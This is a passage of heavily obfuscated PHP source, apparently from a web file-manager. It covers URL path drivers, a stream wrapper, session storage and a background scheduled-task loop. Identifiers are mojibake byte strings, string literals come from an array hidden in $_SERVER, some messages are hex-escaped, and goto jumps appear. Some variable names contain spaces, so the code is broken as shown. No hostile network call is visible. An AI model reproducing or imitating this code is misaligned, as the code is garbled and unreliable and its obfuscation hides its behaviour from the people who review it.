$ÇËéÊƒÔ³´; $ïâ•ˆŞ¢ÉİÌ[] = $‘çÒé±ÉĞ[1411] . $¦İİÆ­; } $–Í± = !empty($ïâ•ˆŞ¢ÉİÌ) ? $‘çÒé±ÉĞ[70] . implode($‘çÒé±ÉĞ[282], $ïâ•ˆŞ¢ÉİÌ) : $‘çÒé±ÉĞ[33]; return $this->getHost() . $‘çÒé±ÉĞ[8] . $àñ . $–Í±; } public function fileOut($†ı¨Ï–æ»Ñ§í, $şı = false, $“‡©¶«î = false, $™ö•œ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($†ı¨Ï–æ»Ñ§í, $şı, $“‡©¶«î, $™ö•œ); } if (!$“‡©¶«î) { $“‡©¶«î = $this->pathThis($†ı¨Ï–æ»Ñ§í); } $×æ‚æ£ËÉ’øä = $şı ? array($_SERVER[ÀÆ][1412] . rawurlencode($“‡©¶«î)) : array(); $Ñ˜èìÁÜÊ = $this->link($†ı¨Ï–æ»Ñ§í, $×æ‚æ£ËÉ’øä); $this->fileOutLink($Ñ˜èìÁÜÊ); } public function fileOutServer($€Ä, $œÅö¤Á·êË© = false, $°­ì´‡‰—ğÁ = false, $âš‚ = '') { parent::fileOut($€Ä, $œÅö¤Á·êË©, $°­ì´‡‰—ğÁ, $âš‚); } public function fileOutImage($£ªÓæ˜ãŞ±, $ûçööã = 250) { $ƒâÎ˜‚çàœæ = $this->link($£ªÓæ˜ãŞ± . $_SERVER[ÀÆ][1413] . $ûçööã); $this->fileOutLink($ƒâÎ˜‚çàœæ); } public function fileOutImageServer($—¡¿ò, $Í‡Ê” = 250) { parent::fileOutImage($—¡¿ò, $Í‡Ê”); } public function hashMd5($½×ù‚) { $×¶á™˜‰ñ™ƒË =& $_SERVER[ÀÆ]; $š™·Úà×í = $this->_objectMeta($½×ù‚); return isset($š™·Úà×í[$×¶á™˜‰ñ™ƒË[208]]) ? $š™·Úà×í[$×¶á™˜‰ñ™ƒË[208]] : !1; } public function size($¸¸å) { $—Œà¼’·ú = $this->objectMeta($¸¸å); return $—Œà¼’·ú ? $—Œà¼’·ú[$_SERVER[ÀÆ][78]] : 0; } public function info($Àì”) { if ($this->isFolder($Àì”)) { return $this->folderInfo($Àì”); } else { if ($this->isFile($Àì”)) { return $this->fileInfo($Àì”); } } return !1; } public function exist($µ®¢Î) { return $this->isFile($µ®¢Î) || $this->isFolder($µ®¢Î); } public function isFile($ûêÑœ) { return !$this->isFolder($ûêÑœ) && $this->objectMeta($ûêÑœ); } public function isFolder($Ïì) { return $this->cacheMethod($_SERVER[ÀÆ][199], $Ïì); } protected function objectMeta($Ç•›š) { return $this->cacheMethod($_SERVER[ÀÆ][200], $Ç•›š); } protected function _objectMeta($Ç©ÔÑèÕ) { $¤øİêÔÒºİ =& $_SERVER[ÀÆ]; if ($Ç©ÔÑèÕ == $¤øİêÔÒºİ[33] || $Ç©ÔÑèÕ == $¤øİêÔÒºİ[8]) { return array(); } $Ë’Ù‚ = $this->ussRequest($Ç©ÔÑèÕ, $¤øİêÔÒºİ[1414]); if (!$Ë’Ù‚[$¤øİêÔÒºİ[1118]]) { return null; } $ôƒèê¬Ë¾À = isset($Ë’Ù‚[$¤øİêÔÒºİ[1120]]) ? $Ë’Ù‚[$¤øİêÔÒºİ[1120]] : array(); if (!isset($ôƒèê¬Ë¾À[$¤øİêÔÒºİ[1415]])) { return null; } $ß¼Â = array($¤øİêÔÒºİ[29] => isset($ôƒèê¬Ë¾À[$¤øİêÔÒºİ[1415]]) ? $ôƒèê¬Ë¾À[$¤øİêÔÒºİ[1415]] : null, $¤øİêÔÒºİ[78] => isset($ôƒèê¬Ë¾À[$¤øİêÔÒºİ[1416]]) ? $ôƒèê¬Ë¾À[$¤øİêÔÒºİ[1416]] : null, $¤øİêÔÒºİ[208] => isset($ôƒèê¬Ë¾À[$¤øİêÔÒºİ[1417]]) ? $ôƒèê¬Ë¾À[$¤øİêÔÒºİ[1417]] : null, $¤øİêÔÒºİ[1384] => isset($ôƒèê¬Ë¾À[$¤øİêÔÒºİ[1418]]) ? $ôƒèê¬Ë¾À[$¤øİêÔÒºİ[1418]] : null); $ß¼Â[$¤øİêÔÒºİ[1385]] = isset($ôƒèê¬Ë¾À[$¤øİêÔÒºİ[1419]]) ? strtotime($ôƒèê¬Ë¾À[$¤øİêÔÒºİ[1419]]) : $ß¼Â[$¤øİêÔÒºİ[1384]]; return $ß¼Â; } protected function _isFolder($İÖ‡Ø„˜©ñ) { $¾Â€ó =& $_SERVER[ÀÆ]; if ($İÖ‡Ø„˜©ñ == $¾Â€ó[33] || $İÖ‡Ø„˜©ñ == $¾Â€ó[8]) { return !0; } $•“Ê‡ = $this->_objectMeta($İÖ‡Ø„˜©ñ); return isset($•“Ê‡[$¾Â€ó[29]]) && $•“Ê‡[$¾Â€ó[29]] == $¾Â€ó[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($õ×ĞÏğë¿ = false) { } public function exist($î€) { $’’µÔš… = $this->info($î€); return $’’µÔš…[$_SERVER[ÀÆ][195]]; } public function isFile($½£œœ­’áÕ§ş) { $ï™ó•ñƒá‡è = $this->info($½£œœ­’áÕ§ş); return $ï™ó•ñƒá‡è[$_SERVER[ÀÆ][195]]; } public function isFolder($â‡öÜ) { return !1; } public function size($›ÊèŞş) { $š•á™³µ½õ¹ = $this->info($›ÊèŞş); return $š•á™³µ½õ¹[$_SERVER[ÀÆ][78]]; } public function info($úÜ) { return $this->infoParse($úÜ); } public function infoAuth($Áµå öÛ‚É) { return $this->infoParse($Áµå öÛ‚É); } public function infoWithChildren($Î¼») { return $this->infoParse($Î¼»); } public function infoFull($ŸÓÂé°÷¿ÈÉ×) { return $this->infoParse($ŸÓÂé°÷¿ÈÉ×); } private function infoParse($îä¦Éî¶) { $Ò­¼¶¨¾™¸ =& $_SERVER[ÀÆ]; $îûûÍÚã¹ƒÀ = $this->header($îä¦Éî¶); if (!$îûûÍÚã¹ƒÀ || !$îûûÍÚã¹ƒÀ[$Ò­¼¶¨¾™¸[735]]) { return !1; } $æšœîé¸ÑŠñÁ = _get($îûûÍÚã¹ƒÀ, $Ò­¼¶¨¾™¸[335], 0); $Ñ´¢¢ô = array($Ò­¼¶¨¾™¸[28] => $îûûÍÚã¹ƒÀ[$Ò­¼¶¨¾™¸[28]], $Ò­¼¶¨¾™¸[76] => $îä¦Éî¶, $Ò­¼¶¨¾™¸[29] => $Ò­¼¶¨¾™¸[193], $Ò­¼¶¨¾™¸[78] => intval($æšœîé¸ÑŠñÁ), $Ò­¼¶¨¾™¸[168] => get_path_ext($îûûÍÚã¹ƒÀ[$Ò­¼¶¨¾™¸[28]]), $Ò­¼¶¨¾™¸[1300] => $æšœîé¸ÑŠñÁ > 0 && $îûûÍÚã¹ƒÀ[$Ò­¼¶¨¾™¸[1420]], $Ò­¼¶¨¾™¸[1301] => !1); return $Ñ´¢¢ô; } private function header($º¹±³) { $¡€¸• =& $_SERVER[ÀÆ]; if (isset(self::$_cacheHeader[$º¹±³])) { return self::$_cacheHeader[$º¹±³]; } $Û™ñ¼î‡Ó  = isset($GLOBALS[$¡€¸•[1421]]) ? $GLOBALS[$¡€¸•[1421]] : !1; $GLOBALS[$¡€¸•[1421]] = !0; self::$_cacheHeader[$º¹±³] = url_header($º¹±³); $GLOBALS[$¡€¸•[1421]] = $Û™ñ¼î‡Ó ; return self::$_cacheHeader[$º¹±³]; } public function hashSimple($É¼Ü”Ïá, $®¤øÉ±¶ = false) { $º¥ü¯ºïŸÈ =& $_SERVER[ÀÆ]; $¿¡À¤Î£áøâ = $this->info($É¼Ü”Ïá); if (!$¿¡À¤Î£áøâ || !$¿¡À¤Î£áøâ[$º¥ü¯ºïŸÈ[195]]) { return !1; } $“ô = $¿¡À¤Î£áøâ[$º¥ü¯ºïŸÈ[78]]; $èû†Çì÷‚Œ¬ = 200; $ÈüÚ½»¹Ü§ = 50; if ($“ô <= $èû†Çì÷‚Œ¬ * $ÈüÚ½»¹Ü§) { return md5($this->fileSubstr($É¼Ü”Ïá, 0, $“ô)) . $“ô; } $ë²óî·×™Ó = intval($“ô / $ÈüÚ½»¹Ü§); $óéØßœÊ­” = $º¥ü¯ºïŸÈ[33]; $»ï½çÎÕ× = timeFloat(); $’áñü©Ñ = 15; for ($Ë­ÃÙ = 0; $Ë­ÃÙ < $ÈüÚ½»¹Ü§; $Ë­ÃÙ++) { if (timeFloat() - $»ï½çÎÕ× > $’áñü©Ñ) { return !1; } $‹§¦ = $this->fileSubstr($É¼Ü”Ïá, $ë²óî·×™Ó * $Ë­ÃÙ, $èû†Çì÷‚Œ¬); if (!$‹§¦) { return !1; } $óéØßœÊ­” .= $‹§¦; } $óéØßœÊ­” .= $this->fileSubstr($É¼Ü”Ïá, $“ô - $èû†Çì÷‚Œ¬, $èû†Çì÷‚Œ¬); return md5($óéØßœÊ­”) . $“ô; } public function getContent($œª¦ıÑì³¨€ñ) { return $this->fileSubstr($œª¦ıÑì³¨€ñ); } public function fileSubstr($ğïÆİ¼­÷ş, $•ôéşÑ¡¸ = 0, $‡ºÎ«ö›º½ŒÆ = -1) { $¡¥•‰” =& $_SERVER[ÀÆ]; $úÈì = $this->info($ğïÆİ¼­÷ş); if (!$úÈì || !$úÈì[$¡¥•‰”[195]] && $úÈì[$¡¥•‰”[78]] > 1024 * 1024 * 10) { return !1; } if ($‡ºÎ«ö›º½ŒÆ === -1) { $‡ºÎ«ö›º½ŒÆ = $úÈì[$¡¥•‰”[78]]; } if ($‡ºÎ«ö›º½ŒÆ == 0) { return $¡¥•‰”[33]; } $­ = array($¡¥•‰”[1422] . $•ôéşÑ¡¸ . $¡¥•‰”[769] . ($•ôéşÑ¡¸ + $‡ºÎ«ö›º½ŒÆ - 1)); $¢Í = url_request($ğïÆİ¼­÷ş, $¡¥•‰”[228], !1, $­, !1, !1, 1); return $¢Í[$¡¥•‰”[1120]] ? $¢Í[$¡¥•‰”[1120]] : $¡¥•‰”[33]; } public function download($îô šßğÓÏëÇ, $Ÿƒ¿Ñ‘) { Downloader::start($îô šßğÓÏëÇ, $Ÿƒ¿Ñ‘); return $Ÿƒ¿Ñ‘; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($á•úÖ, $µ™”Å£ = '') { $this->info = $this->info($á•úÖ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ÀÆ][76]]; $this->pathOpen = $á•úÖ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$á•úÖ])) { self::$_chunkBuffer[$á•úÖ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($†×—ÆÍ‹‘§Ì) { $òí = $this->fileSubstr($this->pose, $†×—ÆÍ‹‘§Ì); $this->pose += strlen($òí); return $òí; } public function stream_tell() { return $this->pose; } public function stream_seek($™²ÑÀ×¢ ¦Ôô, $Ó‡ô) { $ÒİùıµÅ‚ =& $_SERVER[ÀÆ]; if ($Ó‡ô == SEEK_SET) { $this->pose = $™²ÑÀ×¢ ¦Ôô; } else { if ($Ó‡ô == SEEK_CUR) { $this->pose += $™²ÑÀ×¢ ¦Ôô; } else { if ($Ó‡ô == SEEK_END) { $this->pose = $this->info[$ÒİùıµÅ‚[78]] + intval($™²ÑÀ×¢ ¦Ôô); } } } if ($™²ÑÀ×¢ ¦Ôô < 0) { $this->pose = $this->info[$ÒİùıµÅ‚[78]] + $™²ÑÀ×¢ ¦Ôô; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ÀÆ][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Ÿó äõ›ıö†, $¯‰ü®¹é£) { $›¤¦ï­Îœ =& $_SERVER[ÀÆ]; $ÆãšÌÃÔ = $this->info($Ÿó äõ›ıö†); return array($›¤¦ï­Îœ[1423] => 0, $›¤¦ï­Îœ[1424] => 0, $›¤¦ï­Îœ[12] => 32768 + 511, $›¤¦ï­Îœ[1425] => 0, $›¤¦ï­Îœ[1426] => 0, $›¤¦ï­Îœ[1427] => 0, $›¤¦ï­Îœ[1428] => 0, $›¤¦ï­Îœ[78] => $ÆãšÌÃÔ[$›¤¦ï­Îœ[78]], $›¤¦ï­Îœ[1429] => $ÆãšÌÃÔ[$›¤¦ï­Îœ[1299]], $›¤¦ï­Îœ[1385] => $ÆãšÌÃÔ[$›¤¦ï­Îœ[84]], $›¤¦ï­Îœ[1384] => $ÆãšÌÃÔ[$›¤¦ï­Îœ[194]], $›¤¦ï­Îœ[1430] => 0, $›¤¦ï­Îœ[1431] => 0); } static $fileInfo = array(); public function info($¼Ö»‘¼) { $è… = $_SERVER[ÀÆ][1432]; if (isset(self::$fileInfo[$¼Ö»‘¼])) { return self::$fileInfo[$¼Ö»‘¼]; } if (substr($¼Ö»‘¼, 0, strlen($è…)) != $è…) { return !1; } self::$fileInfo[$¼Ö»‘¼] = IO::info(substr($¼Ö»‘¼, strlen($è…))); return self::$fileInfo[$¼Ö»‘¼]; } public static function read($®’·, $ó°¨¥Ó¢», $¸Ñê¬‹ß©Ú) { if (!isset(self::$_fopenCache[$®’·])) { $«Ú¿ = new StreamWrapperIO(); $«Ú¿->stream_open($®’·); self::$_fopenCache[$®’·] = $«Ú¿; } $«Ú¿ = self::$_fopenCache[$®’·]; return $«Ú¿->fileSubstr($ó°¨¥Ó¢», $¸Ñê¬‹ß©Ú); } public static function _read($ÎÔ Î‹±²ïû, $ÍìÂä, $æ‹ßóïà“›Â) { $şÈ•´Ä§é =& $_SERVER[ÀÆ]; $¬‡¾©ÂíÒº¤ = fopen($ÎÔ Î‹±²ïû, $şÈ•´Ä§é[1303]); if (!$¬‡¾©ÂíÒº¤) { return $şÈ•´Ä§é[33]; } $ˆ¨¶àÂ¡‡ = 8192; fseek($¬‡¾©ÂíÒº¤, $ÍìÂä, SEEK_SET); $Ç†Ó£æ÷·Ö = $şÈ•´Ä§é[33]; $¦Â… “€€¹¢ = 0; while ($¦Â… “€€¹¢ < $æ‹ßóïà“›Â) { $«¯Ú¼‰Ï– = min($ˆ¨¶àÂ¡‡, $æ‹ßóïà“›Â - $¦Â… “€€¹¢); $Ç†Ó£æ÷·Ö .= fread($¬‡¾©ÂíÒº¤, $«¯Ú¼‰Ï–); $¦Â… “€€¹¢ += $«¯Ú¼‰Ï–; } fclose($¬‡¾©ÂíÒº¤); return $Ç†Ó£æ÷·Ö; } public function fileSubstr($¹ã¾ŞÇ¬¸°‡, $±äÀõâÒæò) { $›ô¨Åæ÷°î =& $_SERVER[ÀÆ]; $òàÅ™ = $this->info[$›ô¨Åæ÷°î[78]]; $‡•¢° = $¹ã¾ŞÇ¬¸°‡; $å¯Ç³³ïÊ = $±äÀõâÒæò; if ($¹ã¾ŞÇ¬¸°‡ < 0) { $¹ã¾ŞÇ¬¸°‡ = $òàÅ™ + $¹ã¾ŞÇ¬¸°‡; } if ($±äÀõâÒæò === !1) { $±äÀõâÒæò = $òàÅ™ - $¹ã¾ŞÇ¬¸°‡; } if ($¹ã¾ŞÇ¬¸°‡ + $±äÀõâÒæò > $òàÅ™) { $±äÀõâÒæò = $òàÅ™ - $¹ã¾ŞÇ¬¸°‡; } if ($±äÀõâÒæò <= 0) { return $›ô¨Åæ÷°î[33]; } if ($¹ã¾ŞÇ¬¸°‡ < 0 || $¹ã¾ŞÇ¬¸°‡ >= $òàÅ™ || $±äÀõâÒæò <= 0 || $±äÀõâÒæò > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\x6c\145\122\x65\x61\x64\40\x65\x72\162\157\162\41\40\163\x74\141\162\164\x3d{$¹ã¾ŞÇ¬¸°‡}\73\x6c\x65\x6e\x67\x74\150\75{$±äÀõâÒæò}\x3b\40\163\x69\172\145\x3d{$òàÅ™}\x3b"); } $ÇÖ˜Ğê = 64 * 1024; $Û €Š±ä =& self::$_chunkBuffer[$this->path]; if (!$Û €Š±ä) { $Û €Š±ä = array(); } $‰ù¸èÑƒ = 0; $˜¹»Â” = 0; $© ±ç = $›ô¨Åæ÷°î[33]; foreach ($Û €Š±ä as $‰ù¸èÑƒ => $© ±ç) { $‰ù¸èÑƒ = intval($‰ù¸èÑƒ); $˜¹»Â” = $‰ù¸èÑƒ + strlen($© ±ç); if ($¹ã¾ŞÇ¬¸°‡ >= $˜¹»Â”) { continue; } if ($¹ã¾ŞÇ¬¸°‡ >= $‰ù¸èÑƒ && $¹ã¾ŞÇ¬¸°‡ + $±äÀõâÒæò <= $˜¹»Â”) { return substr($© ±ç, $¹ã¾ŞÇ¬¸°‡ - $‰ù¸èÑƒ, $±äÀõâÒæò); } break; } if (count($Û €Š±ä) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($›ô¨Åæ÷°î[1433], $›ô¨Åæ÷°î[1434] . count($Û €Š±ä) . "\73\163\164\141\162\164\75{$¹ã¾ŞÇ¬¸°‡}\x2c\x6c\x65\156\x67\x74\150\x3d{$±äÀõâÒæò}\73\x70\157\163\x65\x3a{$‰ù¸èÑƒ}\x7e{$˜¹»Â”}"); throw new Exception($›ô¨Åæ÷°î[1435]); } $¥Íñõ¦˜Ÿî›˜ = intval($¹ã¾ŞÇ¬¸°‡ / $ÇÖ˜Ğê) * $ÇÖ˜Ğê; $¬ïûË³ä´ò = ceil(($¹ã¾ŞÇ¬¸°‡ + $±äÀõâÒæò) / $ÇÖ˜Ğê) * $ÇÖ˜Ğê - $¥Íñõ¦˜Ÿî›˜; $·À•½ = IO::fileSubstr($this->path, $¥Íñõ¦˜Ÿî›˜, $¬ïûË³ä´ò); $Û €Š±ä[$¥Íñõ¦˜Ÿî›˜ . $›ô¨Åæ÷°î[33]] = $·À•½; ksort($Û €Š±ä); $Ö İÇÅšŒÈ® = substr($·À•½, $¹ã¾ŞÇ¬¸°‡ - $¥Íñõ¦˜Ÿî›˜, $±äÀõâÒæò); return $Ö İÇÅšŒÈ®; } private function log($±¥, $óÔß–) { $’ı =& $_SERVER[ÀÆ]; $şÃ´ŒŸ = timeFloat() - $this->timeStart; write_log(sprintf($’ı[1436], $±¥, $this->info[$’ı[28]], $şÃ´ŒŸ, $óÔß–), $’ı[1110]); } } goto eœø‘øù¤ô; eïÃºÅô„: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ô²õÛ¢ =& $_SERVER[ÀÆ]; static $¯ÂåÁ¢¤ = false; if ($¯ÂåÁ¢¤) { return $¯ÂåÁ¢¤; } $²Ìë = $GLOBALS[$ô²õÛ¢[6]][$ô²õÛ¢[347]]; self::$sessionTime = $²Ìë[$ô²õÛ¢[1531]]; $Ëß‰‹ÙÈÇÏµ“ = isset($GLOBALS[$ô²õÛ¢[1532]]) ? $GLOBALS[$ô²õÛ¢[1532]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Ëß‰‹ÙÈÇÏµ“)) { self::$sessionSign = Cookie::get($Ëß‰‹ÙÈÇÏµ“); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Ëß‰‹ÙÈÇÏµ“, self::$sessionSign, self::$sessionTime); $ö¨ü¯ÎÈË¾÷Ï = $²Ìë[$ô²õÛ¢[1533]]; $Ö¿ÙÄè¨¸ê© = $²Ìë[$ö¨ü¯ÎÈË¾÷Ï]; $€à„˜Í’—ë = $²Ìë[$ô²õÛ¢[820]]; switch ($ö¨ü¯ÎÈË¾÷Ï) { case $ô²õÛ¢[17]: self::$handle = Model($ô²õÛ¢[821]); break; case $ô²õÛ¢[822]: self::$handle = new CacheRedis($Ö¿ÙÄè¨¸ê©, $€à„˜Í’—ë); break; case $ô²õÛ¢[823]: self::$handle = new CacheMemcached($Ö¿ÙÄè¨¸ê©, $€à„˜Í’—ë); break; case $ô²õÛ¢[193]: $Ö¿ÙÄè¨¸ê©[$ô²õÛ¢[76]] = $Ö¿ÙÄè¨¸ê©[$ô²õÛ¢[76]] . $ô²õÛ¢[1534]; self::$handle = new CacheFile($Ö¿ÙÄè¨¸ê©, $€à„˜Í’—ë); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $¯ÂåÁ¢¤ = new self(); return $¯ÂåÁ¢¤; } public static function getBySign($ªÄâÈû) { CacheLock::lock($ªÄâÈû); $âÄ« = self::$handle->get($ªÄâÈû); CacheLock::unlock($ªÄâÈû); $âÄ« = unserialize($âÄ«); return is_array($âÄ«) ? $âÄ« : array(); } public static function setBySign($Í“§±‹³œ±, $ğ³¼ÇĞ) { CacheLock::lock($Í“§±‹³œ±); self::$handle->set($Í“§±‹³œ±, serialize($ğ³¼ÇĞ), self::$sessionTime); CacheLock::unlock($Í“§±‹³œ±); } public static function sign($×ïçèÎşÒ = false) { $×ïçèÎşÒ && (self::$sessionSign = $×ïçèÎşÒ); self::init(); return self::$sessionSign; } public static function set($ÄÀ, $ñÃˆˆ’ = false) { self::init(); if (is_array($ÄÀ)) { foreach ($ÄÀ as $Æ§İ—Ğ›Âà => $îôùòÛÕ§€) { array_set_value(self::$data, $Æ§İ—Ğ›Âà, $îôùòÛÕ§€); } } else { array_set_value(self::$data, $ÄÀ, $ñÃˆˆ’); } self::setBySign(self::$sessionSign, self::$data); } public static function get($«ÑüÓµæ‡ª = false) { self::init(); if (!$«ÑüÓµæ‡ª) { return self::$data; } return array_get_value(self::$data, $«ÑüÓµæ‡ª); } public static function remove($­°›) { self::init(); unset(self::$data[$­°›]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ÀÆ][825])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¬Î’ì =& $_SERVER[ÀÆ]; if (self::valueGet($¬Î’ì[735]) != $¬Î’ì[87]) { return; } if (self::valueGet($¬Î’ì[1535]) == $¬Î’ì[87]) { $şŞÅÅ›Ò = self::valueGet($¬Î’ì[1536]); if (time() - $şŞÅÅ›Ò > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($¬Î’ì[1535], $¬Î’ì[87]); Hook::bind($¬Î’ì[1537], $¬Î’ì[1538]); while (!0) { self::cacheClear(); if (self::valueGet($¬Î’ì[735]) != $¬Î’ì[87]) { self::valueSet($¬Î’ì[1535], $¬Î’ì[191]); self::log($¬Î’ì[1539]); die; } self::valueSet(array($¬Î’ì[1535] => $¬Î’ì[87], $¬Î’ì[1536] => time()), !1); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $¥ş½ÄÂÄÁù¼ =& $_SERVER[ÀÆ]; http_close(); self::valueSet($¥ş½ÄÂÄÁù¼[735], $¥ş½ÄÂÄÁù¼[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¥ş½ÄÂÄÁù¼[1535] => $¥ş½ÄÂÄÁù¼[191], $¥ş½ÄÂÄÁù¼[735] => $¥ş½ÄÂÄÁù¼[87]), !1); } public static function shutdownEvent() { $ÂşÅ…¶ Ø±û =& $_SERVER[ÀÆ]; self::valueSet($ÂşÅ…¶ Ø±û[1535], $ÂşÅ…¶ Ø±û[191]); self::log($ÂşÅ…¶ Ø±û[1540]); } public static function config($…÷êƒ×Ø½‚, $Ôšõ”õ) { self::valueSet($_SERVER[ÀÆ][735], $…÷êƒ×Ø½‚); } private static function taskRunAll() { $ÔÂöìÔ =& $_SERVER[ÀÆ]; $‹ìşŠû‰• = timeFloat(); $³·¢Î€‹ıèÅ = Model($ÔÂöìÔ[1541])->listData(); $‡İÙç«çÑÛ¼ = count($³·¢Î€‹ıèÅ); for ($ğò = 0; $ğò < $‡İÙç«çÑÛ¼; $ğò++) { $¤‰Ï = $³·¢Î€‹ıèÅ[$ğò]; if (!$¤‰Ï[$ÔÂöìÔ[395]] || $¤‰Ï[$ÔÂöìÔ[1542]] != $ÔÂöìÔ[87]) { continue; } if (!self::taskTimeCheck($¤‰Ï)) { continue; } self::taskRun($¤‰Ï); } Hook::trigger($ÔÂöìÔ[1543]); self::taskQueueRun($‹ìşŠû‰•); } private static function taskQueueRun($ˆµôô¶Æá—) { $µ¡“Ïñ× = 10; while (!0) { $î˜ûåè = TaskQueue::run(); if ($î˜ûåè === !1) { break; } if (timeFloat() - $ˆµôô¶Æá— >= $µ¡“Ïñ×) { break; } } } private static function taskTimeCheck($ÉÈÚ„„Åßåãè) { $øİ =& $_SERVER[ÀÆ]; $¨‡ãêå¬ = json_decode($ÉÈÚ„„Åßåãè[$øİ[197]], !0); $ÚÜ·±îªúÙ§Â = intval($ÉÈÚ„„Åßåãè[$øİ[1536]]); $´¢ = strtotime($øİ[1544] . $¨‡ãêå¬[$øİ[1545]] . $øİ[1546]) - strtotime($øİ[1547]); $ş™üåÓ£éå = time() - strtotime(date($øİ[1548]) . $øİ[1549]); $³é³ùæÎëÙûĞ = $ş™üåÓ£éå >= $´¢ && $ş™üåÓ£éå <= $´¢ + 3600; switch ($¨‡ãêå¬[$øİ[29]]) { case $øİ[1550]: if (time() - $ÚÜ·±îªúÙ§Â < 3600 * 24 * 30) { return !1; } if ($¨‡ãêå¬[$øİ[1550]] == date($øİ[1551]) && $³é³ùæÎëÙûĞ) { return !0; } break; case $øİ[1552]: if (time() - $ÚÜ·±îªúÙ§Â < 3600 * 24 * 7) { return !1; } $ºÂ¹Ğ¬ = date($øİ[1553]) == 0 ? 7 : date($øİ[1553]); if ($¨‡ãêå¬[$øİ[1552]] == $ºÂ¹Ğ¬ && $³é³ùæÎëÙûĞ) { return !0; } break; case $øİ[1545]: if (time() - $ÚÜ·±îªúÙ§Â < 3600 * 24) { return !1; } if ($³é³ùæÎëÙûĞ) { return !0; } break; case $øİ[1554]: if (time() - $ÚÜ·±îªúÙ§Â >= floatval($¨‡ãêå¬[$øİ[1554]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ø¸Û” =& $_SERVER[ÀÆ]; static $¦¬²ù¾¹ = 0; $ŸñòŞì€€ = 300; if (!$¦¬²ù¾¹) { $¦¬²ù¾¹ = time(); } if (time() - $¦¬²ù¾¹ < $ŸñòŞì€€) { return; } $¦¬²ù¾¹ = time(); $Á™Öˆ‰¡ = Model($ø¸Û”[507])->db($ø¸Û”[33]); if ($Á™Öˆ‰¡) { $Á™Öˆ‰¡->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($ø¸Û”[1555], $ø¸Û”[1556]); die; } } public static function taskRun($â÷æÎîäÙ›) { $ÃÓŠ‚ıé =& $_SERVER[ÀÆ]; self::log($ÃÓŠ‚ıé[1557] . $â÷æÎîäÙ›[$ÃÓŠ‚ıé[395]] . $ÃÓŠ‚ıé[1558] . $â÷æÎîäÙ›[$ÃÓŠ‚ıé[28]] . $ÃÓŠ‚ıé[1559] . $â÷æÎîäÙ›[$ÃÓŠ‚ıé[1560]]); Model($ÃÓŠ‚ıé[1541])->run($â÷æÎîäÙ›[$ÃÓŠ‚ıé[395]]); $¡ÆâİÏÚ = timeFloat(); $€øúÄ¸Àæ = $ÃÓŠ‚ıé[33]; switch ($â÷æÎîäÙ›[$ÃÓŠ‚ıé[29]]) { case $ÃÓŠ‚ıé[305]: $Ğ–ªÃñ¬¦‡ = url_request($â÷æÎîäÙ›[$ÃÓŠ‚ıé[1560]], $ÃÓŠ‚ıé[228], !1, !1, !1, !1, 10); if ($Ğ–ªÃñ¬¦‡[$ÃÓŠ‚ıé[735]]) { $€øúÄ¸Àæ = strlen($Ğ–ªÃñ¬¦‡[$ÃÓŠ‚ıé[1120]]); } break; case $ÃÓŠ‚ıé[227]: $€øúÄ¸Àæ = Hook::apply($â÷æÎîäÙ›[$ÃÓŠ‚ıé[1560]]); default: break; } Model($ÃÓŠ‚ıé[1561])->add(array($ÃÓŠ‚ıé[1562] => $ÃÓŠ‚ıé[33], $ÃÓŠ‚ıé[1563] => $ÃÓŠ‚ıé[191], $ÃÓŠ‚ıé[29] => $ÃÓŠ‚ıé[1564] . $â÷æÎîäÙ›[$ÃÓŠ‚ıé[395]], $ÃÓŠ‚ıé[1565] => json_encode(array($ÃÓŠ‚ıé[28] => $â÷æÎîäÙ›[$ÃÓŠ‚ıé[28]], $ÃÓŠ‚ıé[1566] => timeFloat() - $¡ÆâİÏÚ, $ÃÓŠ‚ıé[291] => $€øúÄ¸Àæ)))); $ ºÚæ = $€øúÄ¸Àæ ? $ÃÓŠ‚ıé[1567] . $€øúÄ¸Àæ : $ÃÓŠ‚ıé[33]; self::log($ÃÓŠ‚ıé[1568] . $â÷æÎîäÙ›[$ÃÓŠ‚ıé[395]] . $ÃÓŠ‚ıé[530] . $ ºÚæ); return !0; } private static function valueGet($‹Äù±Š·•úÁé) { $ÔæÖµ• =& $_SERVER[ÀÆ]; $ÇÎøá‘¶ = $ÔæÖµ•[1569]; $ÁÃÉŸŒÇşÍ¯ = Model($ÔæÖµ•[427])->get($‹Äù±Š·•úÁé, $ÇÎøá‘¶); if (is_null($ÁÃÉŸŒÇşÍ¯)) { Model($ÔæÖµ•[427])->set($ÔæÖµ•[735], $ÔæÖµ•[87], $ÇÎøá‘¶); Model($ÔæÖµ•[427])->set($ÔæÖµ•[1535], $ÔæÖµ•[191], $ÇÎøá‘¶); $ÁÃÉŸŒÇşÍ¯ = Model($ÔæÖµ•[427])->get($‹Äù±Š·•úÁé, $ÇÎøá‘¶); } return 